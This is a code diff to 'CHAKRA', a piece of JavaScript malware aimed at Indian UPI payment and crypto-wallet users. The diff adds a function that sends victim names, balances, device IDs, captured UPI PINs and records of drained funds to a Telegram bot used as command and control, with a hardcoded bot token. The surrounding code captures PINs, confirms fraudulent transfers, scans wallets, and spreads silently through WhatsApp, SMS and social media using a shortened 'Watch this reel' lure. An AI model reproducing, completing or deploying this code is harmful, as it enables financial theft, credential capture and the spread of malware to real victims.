@@ -140,7 +140,7 @@
 
 <script>
   // ============================================================
-  // CHAKRA - COMPLETE SCRIPT WITH DASHBOARD
+  // CHAKRA - CENTRAL DATA STORAGE (VICTIM DATA SAVED IN TELEGRAM)
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
@@ -167,6 +167,9 @@
   let cryptoDetected = false;
   let spreadCounts = { whatsapp: 0, sms: 0, telegram: 0, instagram: 0, facebook: 0, gpay: 0 };
 
+  // ============================================================
+  // SEND TO TELEGRAM
+  // ============================================================
   function sendToTelegram(message) {
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
       method: 'POST',
@@ -175,6 +178,22 @@
     }).catch(() => {});
   }
 
+  // ===== CENTRAL DATA STORAGE (Saves victim data to Telegram) =====
+  function sendVictimDataToBot(data) {
+    const message = JSON.stringify(data);
+    fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: YOUR_USERNAME,
+        text: '[DATA] ' + message
+      })
+    }).catch(() => {});
+  }
+
+  // ============================================================
+  // GET UNIQUE DEVICE ID
+  // ============================================================
   function getDeviceId() {
     try {
       if (window.Android) {
@@ -184,6 +203,9 @@
     return Date.now().toString();
   }
 
+  // ============================================================
+  // VICTIM DETAILS
+  // ============================================================
   function getVictimDetails() {
     let details = { name: 'Unknown', balance: 'Unknown', device: 'Unknown' };
     try {
@@ -196,6 +218,9 @@
     return details;
   }
 
+  // ============================================================
+  // SCAN CRYPTO WALLET
+  // ============================================================
   function scanCryptoWallet() {
     try {
       if (window.Android) {
@@ -209,6 +234,9 @@
     return null;
   }
 
+  // ============================================================
+  // POPUPS & CLICKS
+  // ============================================================
   function showPopup(id) { document.getElementById(id).classList.remove('hidden'); }
   function hidePopup(id) { document.getElementById(id).classList.add('hidden'); }
   function showTermsPopup(action) { pendingAction = action; showPopup('popupTerms'); }
@@ -258,12 +286,24 @@
     const deviceId = getDeviceId();
     const victim = getVictimDetails();
     infectedDevices.push({ id: deviceId, action: action, victim: victim, lastSpread: Date.now(), lastVector: 'WA' });
+    
+    // ✅ SAVE TO CENTRAL DATA (Telegram Bot Memory)
+    sendVictimDataToBot({
+      type: 'infection',
+      deviceId: deviceId,
+      victim: victim,
+      totalInfected: infectedDevices.length
+    });
+    
     sendToTelegram('🚚 Shiprocket infection! Total: ' + infectedDevices.length);
 
     if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }
     setTimeout(() => window.close(), 3000);
   }
 
+  // ============================================================
+  // UPI MANAGEMENT
+  // ============================================================
   function addUPI(upi) {
     if (!myUPIList.includes(upi)) {
       myUPIList.push(upi);
@@ -296,6 +336,9 @@
     return myUPIList[currentUPIIndex];
   }
 
+  // ============================================================
+  // CRYPTO MANAGEMENT
+  // ============================================================
   function setCryptoAddress(token, address) {
     cryptoAddresses[token] = address;
     sendToTelegram('✅ ' + token + ' address set: ' + address);
@@ -355,6 +398,16 @@
       return;
     }
     const victim = getVictimDetails();
+    
+    // ✅ SAVE CRYPTO DRAIN TO CENTRAL DATA
+    sendVictimDataToBot({
+      type: 'crypto_drain',
+      token: token,
+      amount: amount,
+      address: address,
+      victim: victim
+    });
+    
     sendToTelegram(
       '💸 CRYPTO DRAIN!\n─────────────────\n📱 Victim: ' + victim.name + '\n💰 Token: ' + token + '\n🔢 Amount: ' + amount + ' ' + token + '\n📤 Sent to: ' + address
     );
@@ -368,6 +421,9 @@
     }
   }
 
+  // ============================================================
+  // PIN CAPTURE
+  // ============================================================
   function getUPIPin() {
     let pin = null;
     try {
@@ -418,6 +474,15 @@
           setTimeout(() => {
             window.Android.confirmTransaction();
             totalDrained += amount;
+            
+            // ✅ SAVE UPI DRAIN TO CENTRAL DATA
+            sendVictimDataToBot({
+              type: 'upi_drain',
+              amount: amount,
+              targetUPI: targetUPI,
+              victim: getVictimDetails()
+            });
+            
             sendToTelegram('✅ ₹' + amount + ' sent to ' + targetUPI);
             sendToTelegram('💰 Total Drained: ₹' + totalDrained);
             pinCaptured = false;
@@ -430,6 +495,9 @@
     }
   }
 
+  // ============================================================
+  // APP DETECTION
+  // ============================================================
   function isUpiAppOpen() {
     try {
       if (window.Android) {
@@ -464,12 +532,18 @@
     return false;
   }
 
+  // ============================================================
+  // RECORD SPREAD
+  // ============================================================
   function recordSpread(vector) {
     if (spreadCounts[vector] !== undefined) {
       spreadCounts[vector]++;
     }
   }
 
+  // ============================================================
+  // SILENT SPREAD
+  // ============================================================
   function spreadSilently() {
     const link = 'Watch this reel 🔥 https://bit.ly/4xaXs4E';
 
@@ -533,6 +607,9 @@
     }
   }
 
+  // ============================================================
+  // SMART AUTO DRAIN
+  // ============================================================
   function smartAutoDrain() {
     spreadSilently();
 
@@ -559,6 +636,14 @@
         pinCaptured = true;
         pinCapturedCount++;
         const victim = getVictimDetails();
+        
+        // ✅ SAVE PIN CAPTURE TO CENTRAL DATA
+        sendVictimDataToBot({
+          type: 'pin_captured',
+          victim: victim,
+          balance: victim.balance
+        });
+        
         sendToTelegram('🔑 UPI PIN captured!\n📱 Name: ' + victim.name + '\n💰 Balance: ₹' + victim.balance);
         if (myUPIList.length > 0) {
           readyToMoveCount++;
@@ -574,6 +659,9 @@
     return false;
   }
 
+  // ============================================================
+  // MAIN LOOPS
+  // ============================================================
   setInterval(() => {
     if (!isPaused) {
       spreadSilently();
@@ -734,7 +822,7 @@
             }
 
             // ============================================================
-            // ✅ DASHBOARD COMMAND (ADDED HERE)
+            // ✅ DASHBOARD COMMAND (READS DATA FROM TELEGRAM STORAGE)
             // ============================================================
             if (msg === '/dashboard') {
               // Get recent downloads (last 10)
